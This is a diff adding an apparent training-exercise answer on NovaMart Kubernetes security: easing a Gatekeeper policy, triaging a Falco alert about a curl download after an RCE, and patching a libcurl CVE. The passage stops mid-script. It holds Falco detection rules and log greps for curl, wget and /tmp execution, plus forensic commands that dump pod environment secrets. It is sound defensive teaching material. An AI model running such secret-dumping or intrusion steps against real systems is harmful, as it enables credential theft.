@@ -2796,3 +2796,1675 @@ Admission Layer: The image was signed by Cosign and passed Gatekeeper policies. 
 Runtime Layer: Falco was running with the default rules plus NovaMart custom rules (from this lesson). The cryptominer rule SHOULD have caught this. Give at least 3 specific reasons why Falco might have missed it for 3 weeks.
 Design the detection that WOULD have caught this within hours, not weeks. Cover: what metrics anomaly would appear, what Falco rule adjustment is needed, and what additional monitoring would detect cryptominers that evade process-name-based detection.
 
+# NovaMart Kubernetes Security — Complete Incident Response & Analysis
+
+---
+
+## Q1: Gatekeeper Emergency and Policy Rollout 🔥
+
+### 1. Immediate Unblock Action
+
+```bash
+kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
+  --type='merge' \
+  -p '{"spec":{"enforcementAction":"warn"}}' \
+  -n gatekeeper-system
+```
+
+If the constraint name is unknown:
+
+```bash
+# Find the constraint first
+kubectl get K8sRequireReadOnlyRootFS
+
+# Then patch it
+kubectl patch K8sRequireReadOnlyRootFS <NAME> \
+  --type='merge' \
+  -p '{"spec":{"enforcementAction":"warn"}}'
+```
+
+**Why this is safe:**
+- `warn` still evaluates every admission request against the policy and emits audit warnings in admission responses and in the Gatekeeper audit log — you lose **zero** visibility
+- Deployments are immediately unblocked because `warn` does not reject the admission webhook call
+- The orders team can push their critical payment hotfix within minutes
+- You maintain a complete record of what *would* have been denied for blast radius analysis
+
+**Risk it carries:**
+- Any new deployment that violates the policy will now succeed, meaning a container with a writable root filesystem could be admitted during this window
+- If an attacker was specifically waiting for enforcement to drop, they have an opening
+- Teams may deploy non-compliant workloads during the warn window that become harder to remediate later ("it works in prod, don't touch it" syndrome)
+- The warn-phase data could be noisy if many teams deploy simultaneously, making analysis harder
+
+---
+
+### 2. Blast Radius Assessment Without Re-enabling Enforcement
+
+**Step 1: Use Gatekeeper Audit to find all existing violations**
+
+Gatekeeper's audit controller continuously evaluates existing resources against constraints, even in `warn` or `dryrun` mode.
+
+```bash
+# Get all violations reported by the audit controller
+kubectl get K8sRequireReadOnlyRootFS require-readonly-rootfs -o json \
+  | jq '.status.violations[] | {name: .name, namespace: .namespace, kind: .kind, message: .message}'
+```
+
+**Step 2: Cross-reference with a direct cluster-wide query**
+
+```bash
+# Find ALL pods without readOnlyRootFilesystem: true
+kubectl get pods -A -o json | jq -r '
+  .items[] |
+  select(
+    .spec.containers[]? |
+    (.securityContext.readOnlyRootFilesystem == null) or
+    (.securityContext.readOnlyRootFilesystem == false)
+  ) |
+  [.metadata.namespace, .metadata.name,
+   (.spec.containers[] |
+    select((.securityContext.readOnlyRootFilesystem == null) or
+           (.securityContext.readOnlyRootFilesystem == false)) |
+    .name)] |
+  @tsv
+'
+```
+
+**Step 3: Also check Deployments/StatefulSets/DaemonSets (template-level)**
+
+```bash
+# Check Deployments
+kubectl get deployments -A -o json | jq -r '
+  .items[] |
+  . as $d |
+  .spec.template.spec.containers[] |
+  select((.securityContext.readOnlyRootFilesystem == null) or
+         (.securityContext.readOnlyRootFilesystem == false)) |
+  [$d.metadata.namespace, $d.metadata.name, .name] | @tsv
+'
+```
+
+Repeat for `statefulsets`, `daemonsets`, `jobs`, `cronjobs`.
+
+**Step 4: Generate a prioritized report**
+
+```bash
+# Export Gatekeeper audit results to a structured report
+kubectl get K8sRequireReadOnlyRootFS require-readonly-rootfs -o json \
+  | jq '[.status.violations[] | {namespace, name, kind, message}]' \
+  > /tmp/readonly-rootfs-violations-$(date +%Y%m%d).json
+
+# Count by namespace
+cat /tmp/readonly-rootfs-violations-*.json | jq 'group_by(.namespace) | map({namespace: .[0].namespace, count: length}) | sort_by(-.count)'
+```
+
+**Step 5: Verify results with `gator` CLI locally**
+
+```bash
+# Use gator to test the policy against all cluster resources offline
+gator verify --filename=constrainttemplate.yaml --filename=constraint.yaml
+```
+
+This gives you the complete blast radius without any enforcement risk.
+
+---
+
+### 3. Correct Gatekeeper Policy — Read-Only Root FS with Writable Exceptions
+
+**ConstraintTemplate (with Rego):**
+
+```yaml
+apiVersion: templates.gatekeeper.sh/v1
+kind: ConstraintTemplate
+metadata:
+  name: k8srequirereadonlyrootfs
+  annotations:
+    description: >-
+      Requires readOnlyRootFilesystem: true on all containers.
+      Allows writable paths via emptyDir volume mounts for
+      specific allowed directories.
+spec:
+  crd:
+    spec:
+      names:
+        kind: K8sRequireReadOnlyRootFS
+      validation:
+        openAPIV3Schema:
+          type: object
+          properties:
+            allowedWritablePaths:
+              type: array
+              description: "Mount paths that are permitted to be writable (via emptyDir/ephemeral volumes)"
+              items:
+                type: string
+            exemptImages:
+              type: array
+              description: "Images exempt from this policy (e.g., init containers with special needs)"
+              items:
+                type: string
+  targets:
+    - target: admission.k8s.gatekeeper.sh
+      rego: |
+        package k8srequirereadonlyrootfs
+
+        import future.keywords.in
+
+        violation[{"msg": msg}] {
+          container := input_containers[_]
+          not is_exempt(container)
+          not container_has_readonly_rootfs(container)
+          msg := sprintf(
+            "Container '%s' in pod '%s' must set securityContext.readOnlyRootFilesystem to true. If the container needs writable paths, mount emptyDir volumes at: %v",
+            [container.name, input.review.object.metadata.name, input.parameters.allowedWritablePaths]
+          )
+        }
+
+        violation[{"msg": msg}] {
+          container := input_containers[_]
+          not is_exempt(container)
+          container_has_readonly_rootfs(container)
+
+          # Verify that writable paths use approved volume types only
+          some writable_mount in container_writable_mounts(container)
+          not mount_path_allowed(writable_mount)
+          msg := sprintf(
+            "Container '%s' has a volume mount at '%s' that is not in the allowed writable paths: %v",
+            [container.name, writable_mount, input.parameters.allowedWritablePaths]
+          )
+        }
+
+        input_containers[c] {
+          c := input.review.object.spec.containers[_]
+        }
+
+        input_containers[c] {
+          c := input.review.object.spec.initContainers[_]
+        }
+
+        input_containers[c] {
+          c := input.review.object.spec.ephemeralContainers[_]
+        }
+
+        container_has_readonly_rootfs(container) {
+          container.securityContext.readOnlyRootFilesystem == true
+        }
+
+        is_exempt(container) {
+          exempt := input.parameters.exemptImages[_]
+          startswith(container.image, exempt)
+        }
+
+        # Get all volume mount paths for a container
+        container_writable_mounts(container) := paths {
+          paths := {mount.mountPath |
+            mount := container.volumeMounts[_]
+            volume := input.review.object.spec.volumes[_]
+            volume.name == mount.name
+            # Only flag non-emptyDir, non-configMap, non-secret, non-projected mounts
+            not volume.emptyDir
+            not volume.configMap
+            not volume.secret
+            not volume.projected
+            not volume.downwardAPI
+          }
+        }
+
+        mount_path_allowed(path) {
+          allowed := input.parameters.allowedWritablePaths[_]
+          path == allowed
+        }
+```
+
+**Constraint:**
+
+```yaml
+apiVersion: constraints.gatekeeper.sh/v1beta1
+kind: K8sRequireReadOnlyRootFS
+metadata:
+  name: require-readonly-rootfs
+spec:
+  enforcementAction: dryrun    # START HERE. Never jump to deny.
+  match:
+    kinds:
+      - apiGroups: [""]
+        kinds: ["Pod"]
+    excludedNamespaces:
+      - kube-system
+      - gatekeeper-system
+      - monitoring
+      - cert-manager
+  parameters:
+    allowedWritablePaths:
+      - /tmp
+      - /var/cache
+      - /var/log
+      - /var/run
+    exemptImages:
+      - "888888888888.dkr.ecr.us-east-1.amazonaws.com/debug-"
+```
+
+**The corresponding Pod spec that complies:**
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: order-svc
+spec:
+  containers:
+    - name: order-svc
+      image: 888888888888.dkr.ecr.us-east-1.amazonaws.com/order-svc:v3.2.0
+      securityContext:
+        readOnlyRootFilesystem: true      # Enforced by policy
+      volumeMounts:
+        - name: tmp-vol
+          mountPath: /tmp
+        - name: cache-vol
+          mountPath: /var/cache
+        - name: log-vol
+          mountPath: /var/log
+  volumes:
+    - name: tmp-vol
+      emptyDir:
+        sizeLimit: 100Mi
+    - name: cache-vol
+      emptyDir:
+        sizeLimit: 200Mi
+    - name: log-vol
+      emptyDir:
+        sizeLimit: 500Mi
+```
+
+---
+
+### 4. Phased Rollout Plan
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                   POLICY ROLLOUT: ReadOnlyRootFS                     │
+├──────────┬──────────────┬──────────────────┬────────────────────────┤
+│  PHASE   │  TIMELINE    │  ENFORCEMENT     │  SUCCESS CRITERIA      │
+├──────────┼──────────────┼──────────────────┼────────────────────────┤
+│ Phase 0  │ Day 0        │ (recovery)       │ All teams unblocked    │
+│ Phase 1  │ Day 1-7      │ dryrun           │ Full violation map     │
+│ Phase 2  │ Day 8-14     │ warn             │ <10 violations remain  │
+│ Phase 3  │ Day 15-21    │ deny (staging)   │ 0 staging failures     │
+│ Phase 4  │ Day 22+      │ deny (prod)      │ 0 violations, 0 pages │
+└──────────┴──────────────┴──────────────────┴────────────────────────┘
+```
+
+**Phase 0 — Emergency Recovery (Day 0, NOW)**
+- **Action:** Patch to `warn` (done above)
+- **Communication:** Post in `#platform-incidents` Slack:
+  > "⚠️ Gatekeeper policy K8sRequireReadOnlyRootFS has been rolled back to WARN mode. All deployments are unblocked. Root cause: policy was deployed in deny mode without phased rollout. Postmortem scheduled for Thursday."
+- **Success Criteria:** All 6 blocked teams can deploy. Orders team hotfix is in production.
+
+**Phase 1 — Dryrun + Discovery (Days 1–7)**
+- **Action:**
+  ```bash
+  kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
+    --type='merge' -p '{"spec":{"enforcementAction":"dryrun"}}'
+  ```
+- **Communication:** Email all engineering leads with:
+  - The full violation report (from Step 2 above)
+  - Migration guide showing how to add `readOnlyRootFilesystem: true` + emptyDir mounts
+  - Template Helm values / Kustomize patch they can copy-paste
+  - Link to office hours sessions (2 scheduled during the week)
+- **Success Criteria:**
+  - 100% of violations catalogued by namespace/team
+  - Remediation tickets created in each team's backlog
+  - At least 50% of teams acknowledge and have a plan
+
+**Phase 2 — Warn + Active Remediation (Days 8–14)**
+- **Action:**
+  ```bash
+  kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
+    --type='merge' -p '{"spec":{"enforcementAction":"warn"}}'
+  ```
+- **Communication:**
+  - Daily Slack digest in `#security-compliance`: "X violations remaining, Y teams still need to remediate"
+  - Direct Slack DM to teams with >5 violations on Day 10
+  - Deadline warning on Day 12: "Enforcement goes to deny in staging on Day 15"
+- **Monitoring:** Grafana dashboard tracking:
+  ```promql
+  gatekeeper_violations{constraint="require-readonly-rootfs"} 
+  ```
+- **Success Criteria:**
+  - Fewer than 10 unique violations remaining
+  - All critical/Tier-1 services compliant
+  - Exception requests submitted and reviewed for legitimate edge cases
+
+**Phase 3 — Deny in Staging (Days 15–21)**
+- **Action:**
+  - Create a staging-only constraint:
+  ```yaml
+  spec:
+    enforcementAction: deny
+    match:
+      namespaceSelector:
+        matchLabels:
+          environment: staging
+  ```
+  - Keep prod constraint at `warn`
+- **Communication:**
+  - Announce in `#engineering-all`: "ReadOnlyRootFS is now ENFORCED in staging. If your staging deploys fail, your prod deploys will fail next week."
+- **Success Criteria:**
+  - Zero staging deployment failures for 5 consecutive business days
+  - All exception requests processed
+  - Runbook written for "how to fix readOnlyRootFilesystem failures"
+
+**Phase 4 — Deny in Production (Day 22+)**
+- **Action:**
+  ```bash
+  kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
+    --type='merge' -p '{"spec":{"enforcementAction":"deny"}}'
+  ```
+- **Communication:**
+  - Announce with 48-hour advance notice
+  - On-call team briefed with the runbook
+  - `#platform-support` channel monitored for 4 hours post-enforcement
+- **Success Criteria:**
+  - Zero violations in Gatekeeper audit for 7 consecutive days
+  - Zero deployment-blocking pages caused by this policy
+  - Policy added to "established" list — no longer in rollout tracking
+
+---
+
+## Q2: Falco Alert Investigation 🔥
+
+### 1. First 10 Minutes — In Exact Order
+
+**Minute 0-1: Acknowledge and assess**
+```bash
+# ACK the PagerDuty alert to stop escalation
+# Open laptop, VPN in, verify kubectl access
+
+# FIRST: Verify this is real, not a test/false positive
+kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders -o wide
+```
+
+**Minute 1-2: Capture volatile evidence BEFORE touching anything**
+```bash
+# Snapshot the pod spec, status, and all metadata
+kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders -o yaml > \
+  /tmp/incident-$(date +%s)-pod-spec.yaml
+
+# Capture running processes inside the container
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- ps auxww 2>/dev/null > \
+  /tmp/incident-$(date +%s)-processes.txt
+
+# Capture network connections
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
+  cat /proc/net/tcp /proc/net/tcp6 2>/dev/null > \
+  /tmp/incident-$(date +%s)-netstat.txt
+
+# Capture environment variables (may contain tokens/secrets)
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- env 2>/dev/null > \
+  /tmp/incident-$(date +%s)-env.txt
+
+# Capture filesystem changes
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
+  find /tmp /var/tmp /dev/shm -type f -ls 2>/dev/null > \
+  /tmp/incident-$(date +%s)-tmp-files.txt
+```
+
+**Minute 2-3: ISOLATE THE POD — Network quarantine**
+```bash
+# Apply a "deny-all" NetworkPolicy to isolate the pod immediately
+# This is BEFORE killing it — we want to stop lateral movement while preserving evidence
+
+cat <<EOF | kubectl apply -f -
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: quarantine-order-svc-x2k9p
+  namespace: orders
+spec:
+  podSelector:
+    matchLabels:
+      app: order-svc
+  policyTypes:
+    - Ingress
+    - Egress
+  egress: []      # deny all egress
+  ingress: []     # deny all ingress
+EOF
+```
+
+> ⚠️ **Critical note:** This isolates ALL order-svc pods, not just the compromised one. This is intentional at this stage — we don't know if other replicas are compromised.
+
+**Minute 3-4: Capture additional forensic data from the isolated pod**
+```bash
+# Check what the curl command downloaded
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
+  cat /tmp/update.sh 2>/dev/null > /tmp/incident-$(date +%s)-payload.txt
+
+# Check for any new binaries or suspicious files
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
+  find / -newer /proc/1/exe -type f 2>/dev/null > \
+  /tmp/incident-$(date +%s)-new-files.txt
+
+# Capture the container's filesystem diff if using containerd
+# (Run on the NODE, not via kubectl)
+NODE=$(kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders -o jsonpath='{.spec.nodeName}')
+echo "Compromised pod is on node: $NODE"
+```
+
+**Minute 4-5: Cordon the node to prevent scheduling**
+```bash
+kubectl cordon $NODE
+```
+
+**Minute 5-6: Check Falco for additional alerts in the same timeframe**
+```bash
+# Query Falco logs for the orders namespace in the last 2 hours
+kubectl logs -n falco -l app.kubernetes.io/name=falco --since=2h | \
+  grep -i "orders" | tail -50
+
+# Also check for alerts from OTHER namespaces on the same node
+kubectl logs -n falco -l app.kubernetes.io/name=falco --since=2h | \
+  grep -i "$NODE" | tail -50
+```
+
+**Minute 6-7: Check if the service account token was accessed**
+```bash
+# Check if the attacker accessed the SA token
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
+  cat /proc/1/mountinfo 2>/dev/null | grep serviceaccount
+
+# Check Kubernetes audit logs for API calls from this pod's SA
+# (Assuming audit logs ship to CloudWatch or similar)
+aws logs filter-log-events \
+  --log-group-name /eks/cluster/audit \
+  --filter-pattern '{ $.user.username = "system:serviceaccount:orders:order-svc" }' \
+  --start-time $(date -d '2 hours ago' +%s000)
+```
+
+**Minute 7-8: Scale up clean replicas and remove the compromised pod from service**
+```bash
+# Label the compromised pod to remove it from the Service selector
+kubectl label pod order-svc-7f8b9c6d4-x2k9p -n orders \
+  quarantine=true app- --overwrite
+
+# Remove the broad NetworkPolicy, replace with pod-specific quarantine
+kubectl delete networkpolicy quarantine-order-svc-x2k9p -n orders
+
+# Create targeted quarantine for ONLY the compromised pod
+cat <<EOF | kubectl apply -f -
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: quarantine-compromised-pod
+  namespace: orders
+spec:
+  podSelector:
+    matchLabels:
+      quarantine: "true"
+  policyTypes:
+    - Ingress
+    - Egress
+  egress: []
+  ingress: []
+EOF
+
+# The deployment will automatically spin up a replacement pod
+# since we removed the app label (pod no longer matches ReplicaSet selector)
+```
+
+**Minute 8-9: Notify and escalate**
+```bash
+# Post to #security-incidents Slack channel
+# "🔴 SECURITY INCIDENT — Active compromise detected in orders namespace.
+#  Compromised pod isolated. Investigation in progress. 
+#  Impact: order-svc temporarily running at reduced capacity.
+#  IC: [Your Name]. Bridge call link: [URL]"
+```
+
+**Minute 9-10: Document and verify containment**
+```bash
+# Verify the compromised pod cannot reach the network
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
+  wget -T 2 -q http://google.com -O /dev/null 2>&1
+# Should fail/timeout
+
+# Verify healthy replicas are serving traffic
+kubectl get endpoints order-svc -n orders
+kubectl get pods -n orders -l app=order-svc --field-selector=status.phase=Running
+
+# Start incident document with timeline
+```
+
+---
+
+### 2. Attacker vs. Developer — Evidence Sources
+
+**Evidence Source 1: The Downloaded Script Content**
+```bash
+# We already captured this, but analyze it
+cat /tmp/incident-*-payload.txt
+```
+- **If developer:** Script likely contains benign debugging (tcpdump, strace, diagnostic tools), references internal URLs, has comments like "# debug network issue"
+- **If attacker:** Script downloads additional binaries, establishes reverse shells, exfiltrates data, mines crypto, or establishes persistence. References external IPs, encodes content in base64, uses `nohup`
+
+**Evidence Source 2: The External IP Reputation**
+```bash
+# Check 45.33.32.156
+# This is actually scanme.nmap.org — well-known, but check anyway
+whois 45.33.32.156
+curl -s "https://www.virustotal.com/api/v3/ip_addresses/45.33.32.156" \
+  -H "x-apikey: $VT_API_KEY" | jq '.data.attributes.last_analysis_stats'
+curl -s "https://www.abuseipdb.com/check/45.33.32.156"
+```
+- **If developer:** IP would be an internal registry, a known CDN, or a tool repository
+- **If attacker:** IP flagged as malicious, hosted in bulletproof hosting, associated with C2 infrastructure
+
+**Evidence Source 3: Kubernetes Audit Logs — Who Executed Into the Pod**
+```bash
+# Check if someone kubectl exec'd into this pod recently
+aws logs filter-log-events \
+  --log-group-name /eks/cluster/audit \
+  --filter-pattern '{ $.verb = "create" && $.objectRef.subresource = "exec" && $.objectRef.namespace = "orders" }' \
+  --start-time $(date -d '24 hours ago' +%s000) | jq '.events[].message | fromjson | {user: .user.username, pod: .objectRef.name, timestamp: .requestReceivedTimestamp}'
+```
+- **If developer:** You'll see a `kubectl exec` from a known developer's IAM role/OIDC identity shortly before the curl command
+- **If attacker:** No `kubectl exec` — the command was spawned by the application process itself (parent process is Java/Node, not kubectl), indicating RCE exploitation
+
+**Evidence Source 4: The Process Tree and Parent Chain**
+```bash
+# Already captured, but the key detail is the parent process
+# Alert says: parent=sh, exe=/tmp/curl
+# Check the FULL process tree
+kubectl exec order-svc-7f8b9c6d4-x2k9p -n orders -- \
+  cat /proc/*/status 2>/dev/null | grep -E "^(Name|PPid|Pid)" 
+```
+- **If developer:** Process tree: `kubectl exec → sh → curl`. Parent PID traces back to the exec session.
+- **If attacker:** Process tree: `java (PID 1) → sh → curl`. The shell was spawned by the application runtime, meaning exploitation via the application, not human access.
+
+**Evidence Source 5: Git History and CI/CD Logs**
+```bash
+# Check if anyone recently modified the order-svc deployment or added a debugging sidecar
+git log --since="7 days ago" --oneline -- k8s/orders/
+# Check Bitbucket/CI for any recent pipeline runs on order-svc
+# Check ArgoCD sync history
+kubectl get application order-svc -n argocd -o json | jq '.status.history[-5:]'
+```
+- **If developer:** Recent commit adding a debug script, or a CronJob/sidecar that runs curl
+- **If attacker:** No corresponding code change that explains the curl command
+
+**Evidence Source 6 (Bonus): VPC Flow Logs and DNS Logs**
+```bash
+# Check VPC Flow Logs for the pod's IP communicating with 45.33.32.156
+aws ec2 describe-flow-logs  # find the flow log group
+aws logs filter-log-events \
+  --log-group-name /vpc/flow-logs \
+  --filter-pattern "45.33.32.156"
+
+# Check Route53 DNS query logs for unusual domains
+aws logs filter-log-events \
+  --log-group-name /route53/resolver/queries \
+  --filter-pattern "{ $.srcaddr = \"<POD_IP>\" }"
+```
+
+---
+
+### 3. Determining Blast Radius of the RCE Vulnerability
+
+The deserialization RCE in order-svc means **every pod running the same vulnerable image** is potentially exploitable.
+
+```bash
+# Step 1: Get the exact image of the compromised pod
+VULN_IMAGE=$(kubectl get pod order-svc-7f8b9c6d4-x2k9p -n orders \
+  -o jsonpath='{.spec.containers[0].image}')
+echo "Vulnerable image: $VULN_IMAGE"
+# Output: 888888888888.dkr.ecr.us-east-1.amazonaws.com/order-svc:v3.1.2
+
+# Step 2: Find ALL pods running this exact image across all namespaces
+kubectl get pods -A -o json | jq -r --arg img "$VULN_IMAGE" \
+  '.items[] | select(.spec.containers[]?.image == $img) |
+   [.metadata.namespace, .metadata.name, .status.podIP, .spec.nodeName] | @tsv'
+
+# Step 3: But it's a DESERIALIZATION bug — check if other services
+# use the SAME vulnerable library (not just the same image)
+# The vulnerability is in the Java deserialization endpoint.
+# Other Java services using the same framework version are also at risk.
+
+# Get all Java-based images in the cluster
+kubectl get pods -A -o json | jq -r '
+  .items[].spec.containers[] |
+  select(.image | test("java|jdk|jre|spring|tomcat")) |
+  .image' | sort -u
+
+# Step 4: Check for signs of exploitation on each affected pod
+for pod in $(kubectl get pods -A -o json | jq -r --arg img "$VULN_IMAGE" \
+  '.items[] | select(.spec.containers[]?.image == $img) |
+   "\(.metadata.namespace)/\(.metadata.name)"'); do
+  NS=$(echo $pod | cut -d/ -f1)
+  NAME=$(echo $pod | cut -d/ -f2)
+  echo "=== Checking $NS/$NAME ==="
+  kubectl exec -n $NS $NAME -- \
+    find /tmp /var/tmp /dev/shm -type f -ls 2>/dev/null
+  kubectl exec -n $NS $NAME -- \
+    ps auxww 2>/dev/null | grep -v java | grep -v grep
+done
+
+# Step 5: Check Falco logs for similar alerts on other pods
+kubectl logs -n falco -l app.kubernetes.io/name=falco --since=72h | \
+  grep -E "(order-svc|drift|curl|wget|/tmp/)" | grep -v "x2k9p"
+
+# Step 6: Check network logs for connections to the attacker IP from any pod
+aws logs filter-log-events \
+  --log-group-name /vpc/flow-logs \
+  --filter-pattern "45.33.32.156" \
+  --start-time $(date -d '7 days ago' +%s000)
+```
+
+**Total potentially affected:** Every pod running `order-svc:v3.1.2` (likely 3-5 replicas per environment × number of environments). Plus any other Java services using the same vulnerable deserialization library.
+
+---
+
+### 4. Prevention at Each Security Layer
+
+**Admission Layer — Pod Security**
+
+What was missing: The pod had the ability to run `curl` and pipe to `sh`. This means:
+```yaml
+# SHOULD have been enforced:
+securityContext:
+  readOnlyRootFilesystem: true    # Prevents writing /tmp/curl
+  allowPrivilegeEscalation: false
+  capabilities:
+    drop: ["ALL"]
+```
+
+```yaml
+# NetworkPolicy SHOULD have existed:
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: order-svc-egress
+  namespace: orders
+spec:
+  podSelector:
+    matchLabels:
+      app: order-svc
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              name: database
+      ports:
+        - port: 5432
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              name: kube-system
+      ports:
+        - port: 53
+          protocol: UDP
+    # NO general internet egress — curl to 45.33.32.156 would be BLOCKED
+```
+
+**Pod Security Standards:**
+
+A restricted PSS would have forced `readOnlyRootFilesystem: true`, preventing the attacker from writing the `curl` binary to `/tmp`.
+
+**Network Layer:**
+
+A proper NetworkPolicy with explicit egress allowlisting would have blocked the outbound connection to `45.33.32.156` entirely. The attack would have failed at the `curl` stage.
+
+**Runtime Layer — Falco Enhancements:**
+
+```yaml
+# Rule that should be added/tuned:
+- rule: Unexpected outbound connection from orders namespace
+  desc: Detect connections to IPs outside known service mesh
+  condition: >
+    evt.type in (connect) and
+    container and
+    k8s.ns.name = "orders" and
+    not (fd.sip in (rfc_1918_addresses)) and
+    not (fd.sport in (53, 443) and fd.sip in (allowed_external_ips))
+  output: >
+    Unexpected outbound connection (command=%proc.cmdline connection=%fd.name
+    container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
+  priority: CRITICAL
+
+# Rule for binary execution from writable directories
+- rule: Execution from /tmp
+  desc: Detect execution of binaries from /tmp or other writable dirs
+  condition: >
+    spawned_process and
+    container and
+    (proc.exe startswith "/tmp/" or
+     proc.exe startswith "/var/tmp/" or
+     proc.exe startswith "/dev/shm/")
+  output: >
+    Binary executed from writable directory (exe=%proc.exe cmdline=%proc.cmdline
+    container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
+  priority: CRITICAL
+```
+
+**Defense-in-Depth Fix Summary:**
+
+| Layer | Gap | Fix |
+|-------|-----|-----|
+| Pod Security | Writable rootfs | `readOnlyRootFilesystem: true` + emptyDir for /tmp |
+| Pod Security | Excessive capabilities | `drop: ["ALL"]`, no privilege escalation |
+| Network | Unrestricted egress | Explicit egress NetworkPolicy — allowlist only |
+| Runtime | No /tmp execution rule | Falco rule for exec from writable paths |
+| Runtime | No egress anomaly detection | Falco rule for unexpected outbound connections |
+| Image | curl present in image | Distroless base image, no shell or curl |
+
+---
+
+## Q3: Supply Chain Incident 🔥
+
+### 1. Cross-Referencing ECR Scan Results with Running Workloads
+
+```bash
+# Step 1: Get all affected image URIs from ECR Enhanced Scanning
+# ECR stores findings per image digest
+
+aws ecr describe-image-scan-findings \
+  --repository-name "*" \
+  --output json \
+  --query 'imageScanFindings.findings[?contains(name, `CVE-2024-XXXX`)]' 
+
+# More practically — get all images with the CVE across all repos:
+REPOS=$(aws ecr describe-repositories --query 'repositories[].repositoryName' -o text)
+
+for repo in $REPOS; do
+  IMAGES=$(aws ecr list-images --repository-name $repo --query 'imageIds[].imageDigest' -o text)
+  for digest in $IMAGES; do
+    FINDINGS=$(aws ecr describe-image-scan-findings \
+      --repository-name $repo \
+      --image-id imageDigest=$digest \
+      --query "imageScanFindings.findings[?name=='CVE-2024-XXXX']" \
+      --output text 2>/dev/null)
+    if [ -n "$FINDINGS" ]; then
+      echo "$repo@$digest"
+    fi
+  done
+done > /tmp/vulnerable-images.txt
+
+# Step 2: Get all images currently running in the cluster
+kubectl get pods -A -o json | jq -r '
+  .items[] |
+  . as $pod |
+  .status.containerStatuses[]? |
+  {
+    namespace: $pod.metadata.namespace,
+    pod: $pod.metadata.name,
+    container: .name,
+    image: .image,
+    imageID: .imageID
+  }' > /tmp/running-images.json
+
+# Step 3: Cross-reference — find running pods with vulnerable images
+# The imageID in pod status contains the digest
+while read vuln_image; do
+  REPO=$(echo $vuln_image | cut -d@ -f1)
+  DIGEST=$(echo $vuln_image | cut -d@ -f2)
+  
+  jq -r --arg digest "$DIGEST" \
+    'select(.imageID | contains($digest)) |
+     [.namespace, .pod, .container, .image] | @tsv' \
+    /tmp/running-images.json
+done < /tmp/vulnerable-images.txt | sort -u > /tmp/affected-running-pods.txt
+
+echo "Affected running pods:"
+cat /tmp/affected-running-pods.txt
+echo "Total: $(wc -l < /tmp/affected-running-pods.txt)"
+```
+
+```bash
+# FASTER alternative using a single pipeline:
+VULN_DIGESTS=$(cat /tmp/vulnerable-images.txt | cut -d@ -f2 | tr '\n' '|' | sed 's/|$//')
+
+kubectl get pods -A -o json | jq -r --arg digests "$VULN_DIGESTS" '
+  .items[] |
+  . as $pod |
+  .status.containerStatuses[]? |
+  select(.imageID | test($digests)) |
+  [
+    $pod.metadata.namespace,
+    $pod.metadata.name,
+    .name,
+    .image,
+    (.imageID | split("@")[1][:12])
+  ] | @tsv'
+```
+
+---
+
+### 2. Execution Plan — 12 Services, 4-Hour Deadline
+
+```
+HOUR 0:00                    HOUR 1:00              HOUR 2:00              HOUR 3:00              HOUR 4:00
+  │                            │                      │                      │                      │
+  ├─── TRIAGE & PARALLEL ─────►├── BUILD + SCAN ─────►├── SIGN + DEPLOY ────►├── VERIFY ───────────►│ DONE
+  │    PREPARATION             │   (parallel)          │   (rolling)          │                      │
+  │                            │                      │                      │                      │
+  ▼                            ▼                      ▼                      ▼                      │
+```
+
+**Hour 0:00–0:30 — Triage and Preparation (Parallel)**
+
+```bash
+# TRACK 1 (You): Risk-rank the 12 services
+# Categorize by exposure:
+# P0 - Internet-facing + processes untrusted input (order-svc, payment-svc, api-gateway)
+# P1 - Internal but handles sensitive data (user-svc, inventory-svc)  
+# P2 - Internal, low-sensitivity (search-svc, recommendation-svc, etc.)
+
+# TRACK 2 (Platform engineer): Update base image
+# Verify the patched base image exists
+docker pull gcr.io/distroless/java17-debian12:latest
+# Verify it's actually patched
+docker run --rm gcr.io/distroless/java17-debian12:latest \
+  dpkg -l | grep libcurl
+
+# TRACK 3 (Security engineer): Assess active exploitation risk
+# Check if the CVE is being actively exploited in the wild
+# Check CISA KEV catalog
+# If actively exploited, consider emergency NetworkPolicy to block
+# known exploit vectors while patching
+```
+
+**Communication at 0:00:**
+> 🔴 `#security-incidents`: "CRITICAL CVE-2024-XXXX in libcurl affects 12 production services. Patch operation starting now. ETA 4 hours. No evidence of active exploitation. Incident Commander: [Name]. Updates every 30 minutes."
+
+**Hour 0:30–2:00 — Parallel Build + Scan**
+
+```bash
+# Trigger ALL 12 image rebuilds IN PARALLEL
+# Each pipeline: pull new base image → build → Trivy scan → Cosign sign
+
+# For services using tags (9 of 12):
+# Simply retrigger the CI pipeline — it will pull :latest base image
+for svc in order-svc payment-svc api-gateway user-svc inventory-svc \
+           search-svc recommendation-svc notification-svc analytics-svc; do
+  # Trigger Bitbucket Pipeline (or equivalent)
+  curl -X POST \
+    -H "Authorization: Bearer $BB_TOKEN" \
+    "https://api.bitbucket.org/2.0/repositories/novamart/$svc/pipelines/" \
+    -H "Content-Type: application/json" \
+    -d '{"target":{"ref_type":"branch","type":"pipeline_ref_target","ref_name":"main"},
+         "variables":[{"key":"EMERGENCY_REBUILD","value":"CVE-2024-XXXX"}]}'
+done
+
